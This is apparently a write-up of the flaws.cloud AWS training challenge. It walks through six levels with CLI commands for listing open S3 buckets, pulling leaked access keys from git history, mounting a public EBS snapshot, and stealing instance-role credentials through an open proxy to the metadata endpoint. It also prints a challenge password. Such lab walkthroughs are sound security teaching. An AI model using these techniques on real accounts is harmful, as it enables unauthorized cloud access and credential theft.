# [flaws.cloud](http://flaws.cloud)

* [**LEVEL-1**](#level-1)  
* [**LEVEL-2**](#level-2)  
* [**LEVEL-3**](#level-3)  
* [**LEVEL-4**](#level-4)  
* [**LEVEL-5**](#level-5)  
* [**LEVEL-6**](#level-6)  

## Level 1
> [URL](http://flaws.cloud)

**Flaw: Permission Misconfiguration: Anyone could list the bucket content.**


* List the bucket contents for `flaws.cloud`
	```
	aws s3 ls s3://flaws.cloud --no-sign-request
	```
* Get the `html` file
	```
	aws s3 cp s3://flaws.cloud/secret-dd02c7c.html . --no-sign-request
	```
<br/>

## Level 2
> [URL](http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/)

#### [*AWS ACCOUNT AND CLI CONFIGURATION NEEDED !!!*](https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html)
Configure AWS CLI with Access Key ID and Secret Access Key
```bash
$ aws configure --profile YOUR_PROFILE                            
AWS Access Key ID [********************]: 
AWS Secret Access Key [********************]: 
Default region name [ap-south-1]: 
Default output format [text]:
```

**Flaw: Any authenticated AWS user could list the bucket contents**

* List the bucket contents for the url using AWS account
	```
	aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --profile YOUR_PROFILE
	```
* Get the secret html file
	```
	aws s3 cp s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html . --profile YOUR_PROFILE
	```
<br/>


## Level 3
> [URL](http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/)

**Flaw: Bucket listing permissions for everyone and leaked access keys in git commits**
* List the bucket contents for the url using AWS profile
	```
	aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud --profile YOUR_PROFILE
	```
* Download the  `.git` folder
	```
	aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git l3-dump  --profile YOUR_PROFILE
	```
* Check the git logs
	```
	git log
	```
* Check the first commit
	```
	git checkout {commit hash}
	```
* Check the commit contents
	```
	git show
	```
* Create a profile using the credentials
	```
	aws configure --profile flaws-l3
	```
	* Enter `AKIA` and `Secret access Key` from the git commit
	
* List all the buckets for the newly created profile
	```
	aws s3 ls --profile flaws-l3
	```
<br/>

## Level 4
> [URL](http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/)
> [ec2 url](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud)

**Flaw: Snapshot of EC2 instance made public**

* Use `nslookup` and get the region of the snapshot
	* `nslookup 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud`
	* Region: `us-west-2`
* Using the flaws-l3 profile look for ec2 snapshots
	```
	aws ec2 describe-snapshots --profile flaws-l3
	```
* Get account id for the flaws-l3 keys
	```
	aws --profile flaws sts get-caller-identity
	```
* List the ec2 snapshots for the particular owner
	```
	aws ec2 describe-snapshots --profile flaws-l3 --owner-id {owner-id} --region us-west-2
	```
* Mount the volume using the `snapshot id` to your acc
	```
	aws --profile {YOUR_ACCOUNT} ec2 create-volume --availability-zone us-west-2a --region us-west-2 --snapshot-id snap-0b49342abd1bdcb89
	```
*  Create an ec2 instance in the `us-west-2` region 
*  Attach the snapshot as an extra volume
*  Connect to the ec2 instance using `ssh` with the keypair while setting up the ec2
	```
	ssh -i "flaws4.pem" ubuntu@ec2-35-85-61-84.us-west-2.compute.amazonaws.com
	```
* Mount the volume
	* `sudo file -s /dev/xvdf1`
	* `sudo mount /dev/xvdf1 /mnt`
* Look around in the snapshot
	* We get credentials in `/home/ubuntu/setupNginx.sh`
		* `flaws:nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M`
* Enter the credentials [here](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud)
* Terminate the EC2 instance

<br/>

## Level 5
> [URL](http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/)

**Flaw: exposed proxy which doesn't restrict access to instance's meta-data server and private IP range**

**The IP address `169.254.169.254` is a **magic IP** in the cloud world. AWS, Azure, Google, DigitalOcean and others use this to allow cloud resources to find out metadata about themselves.** 

**Each EC2 instance has metadata available on a magic private (only itself can access) IP address `169.254.169.254`. The juiciest part of this metadata, are the credentials for the Instance Profile (if one is set), which can be retrieved through a web request to http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance/.**

* Get the meta-data listing
	```
	curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/
	```
* We get credentials at this [url](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance) 
	```
	curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
	```
* Configure using the keys
	```
	aws configure --profile flaws-l5```
* Add the Access Key ID, Secret Access key and **Session token** to `/.aws/credentials`
* List the contents of the level6 bucket
	```
	aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud --profile flaws-l5
	```
<br/>

## Level 6
> [URL](http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/)

**Flaw: Extra permissions given to policies **

* Create a profile using the provided credentials
	```
	aws configure --profile flaws-l6
	```
* Get other info about the profile 
	```
	aws --profile flaws-l6 iam get-user
	```
* List the IAM policies attached to the user 
	```
	aws --profile flaws-l6 iam list-attached-user-policies --user-name Level6
	```
* Get more info on the policy `list_apigateways`
	```
	aws --profile flaws-l6 iam get-policy --policy-arn arn:aws:iam::975426262029:policy/list_apigateways
	```
* Get the version of the policy
	```
	aws --profile flaws-l6 iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4
	```
* The policy tells us we can `GET` on the resource `arn:aws:apigateway:us-west-2::/restapis/*`
* Enumerating the other policy `MySecurityAudit`, it lets us see some things about lambdas.
* List the lambda functions
	```
	aws --profile flaws-l6 --region us-west-2 lambda list-functions
	```
* Get policy for the function 
	```
	aws --profile flaws-l6 --region us-west-2 lambda get-policy --function-name Level6
	```
* Use the API ID: `s33ppypa75` and get the stage
	```
	aws --profile flaws-l6 --region us-west-2 apigateway get-stages --rest-api-id s33ppypa75
	```
	
* That tells you the stage name is "**Prod**". Lambda functions are called using that rest-api-id, stage name, region, and resource as 
	* Format:   
	`https://<API-id>.execute-api.<region>.amazonaws.com/<stage-name>/<resource>`
		* API-id: `s33ppypa75`
		* Region: `us-west-2`
		* Stage: `Prod`
		* Resource: `level6`
	* URL : https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6
	* On visting the url it displays another URL which is the [final URL](http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/) 


```
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_ 
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|
		flAWS - The End
```	
